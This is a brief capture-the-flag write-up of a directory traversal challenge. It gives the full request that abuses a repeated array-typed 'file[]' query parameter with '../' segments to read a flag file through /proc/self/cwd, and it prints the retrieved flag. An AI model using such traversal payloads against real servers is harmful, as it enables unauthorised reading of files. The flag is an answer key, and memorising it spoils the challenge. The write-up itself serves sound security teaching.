## CTF Challenge: Directory Traversal Exploit

### Target Application:
**URL:** `http://43.205.178.174:8182/`

### Summary:
The challenge appears to be a directory traversal vulnerability allowing access to restricted files by manipulating query parameters.

### Solution:
By leveraging the `file[]` parameter, we can traverse directories and access the flag file. The following payload was used to exploit the vulnerability:

```
http://43.205.178.174:8182/getfile?file[]=../../&file[]=../../&file[]=../../&file[]=../../&file[]=../../proc/self/cwd/flag.txt&file[]=.&file[]=js
```

### Retrieved Flag:
**`ctf7{sh0uld_str1ng1fy_th3_p4r4ms}`**
